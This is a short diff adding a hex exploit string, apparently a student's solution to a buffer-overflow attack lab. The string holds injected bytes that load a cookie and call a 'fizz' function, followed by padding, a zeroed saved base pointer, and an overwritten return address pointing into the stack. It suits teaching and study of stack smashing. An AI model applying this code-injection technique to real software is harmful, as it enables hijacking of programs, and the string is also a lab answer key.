@@ -1,0 +1,10 @@
+/* bad code of asm */
+/* mov cookie, %edi */
+/* call fizz */
+bf ea 1b 56 2e e8 1e d7 d7 aa
+/* complete the string */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+/* rbp */
+00 00 00 00 00 00 00 00
+/* ret add */
+b0 39 68 55 00 00 00 00
